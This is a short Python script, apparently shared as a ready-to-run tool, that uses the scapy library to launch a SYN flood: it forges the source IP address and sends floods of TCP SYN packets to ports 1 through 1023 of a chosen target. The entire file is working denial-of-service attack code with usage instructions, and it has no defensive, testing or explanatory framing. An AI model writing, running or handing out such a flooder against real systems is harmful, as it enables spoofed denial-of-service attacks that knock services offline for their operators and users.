#!/usr/bin/python
"""
simple implementation of syn flooder with scapy
you'll need scapy 
apt-get install scapy 
pip install scapy
http://www.secdev.org/projects/scapy/
"""

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
	print sys.argv[0] + " <spoofed_source_ip> <target>"
	sys.exit(0)

packet = IP(src= sys.argv[1], dst = sys.argv[2]) / TCP(dport=range(1,1024), flags="S")

srflood(packet,store=0)
